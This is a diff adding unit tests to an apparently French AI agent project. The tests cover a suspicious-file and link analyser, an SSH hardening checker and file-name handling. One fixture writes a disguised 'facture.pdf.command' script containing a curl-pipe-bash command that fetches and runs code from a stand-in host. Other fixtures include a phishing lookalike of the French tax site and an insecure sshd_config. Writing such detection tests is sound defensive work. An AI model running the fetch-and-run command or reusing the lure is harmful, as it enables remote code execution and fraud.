@@ -2864,3 +2864,43 @@ class TypographicEdits(unittest.TestCase):
         self.assertEqual(hit("fais un audit de sécurité de mon projet"), ["audit-securite"])
         for t in ("crée un cours de médecine en PDF", "fais une calculatrice en python", "crée un site pour un boulanger"):
             self.assertEqual(hit(t), [])
+
+    def test_cybersecurity_file_and_link_never_opened(self):
+        import importlib.util
+        f = Path(__file__).resolve().parent.parent / "plugins_builtin/cybersecurite/skills/fichier-suspect/analyser.py"
+        spec = importlib.util.spec_from_file_location("an", f); an = importlib.util.module_from_spec(spec); spec.loader.exec_module(an)
+        an.signs.clear(); an.link("https://impots-gouv-remboursement.xyz/login")
+        self.assertTrue(any("impots.gouv.fr" in w for _, w, _ in an.signs))
+        an.signs.clear(); an.link("https://www.impots.gouv.fr/accueil")
+        self.assertEqual(an.signs, [])
+        with tempfile.TemporaryDirectory() as t:
+            x = Path(t, "facture.pdf.command"); x.write_text("#!/bin/bash\ncurl -s http://x.y/a.sh | bash\n")
+            an.signs.clear(); an.file(str(x))
+            self.assertGreaterEqual(sum(l == "haute" for l, _, _ in an.signs), 2)
+
+    def test_cybersecurity_hardening_reads_sshd(self):
+        import importlib.util
+        f = Path(__file__).resolve().parent.parent / "plugins_builtin/cybersecurite/skills/durcissement/verifier.py"
+        spec = importlib.util.spec_from_file_location("ve", f); ve = importlib.util.module_from_spec(spec); spec.loader.exec_module(ve)
+        with tempfile.TemporaryDirectory() as t:
+            c = Path(t, "sshd_config"); c.write_text("PermitRootLogin yes\nPasswordAuthentication yes\n")
+            ve.good.clear(); ve.bad.clear(); ve.ssh(str(c))
+            self.assertTrue(any("PermitRootLogin" in w and l == "haute" for w, _, l in ve.bad))
+
+    def test_image_name_spelled_two_ways(self):
+        import docs
+        with tempfile.TemporaryDirectory() as t:
+            t = Path(t); (t / "images").mkdir(); (t / "images" / "cœur.jpg").write_bytes(b"x")
+            said = docs._figure_trouble('<img src="images/coeur.jpg" alt="Le cœur">', t)
+            self.assertIn("images/cœur.jpg", said[0])
+            self.assertIn("Ne mets jamais une autre image", docs._figure_trouble('<img src="foie.jpg">', t)[0])
+        src = (Path(__file__).resolve().parent.parent / "plugins_builtin/pdf-pro/skills/pdf-pro/images.py").read_text()
+        self.assertIn('replace("œ", "oe")', src)  # a downloaded image gets one plain spelling
+
+    def test_missing_file_names_the_close_ones(self):
+        with tempfile.TemporaryDirectory() as t:
+            Path(t, "cours-medecine.html").write_text("x"); Path(t, "01-introduction.md").write_text("x")
+            a = naimtools.Agent(t, "naim", auto_yes=True, emit=lambda e: None)
+            r = a.read_file("cours-medecine.md")
+            self.assertTrue(r.startswith("error: file not found"))
+            self.assertIn("cours-medecine.html", r)
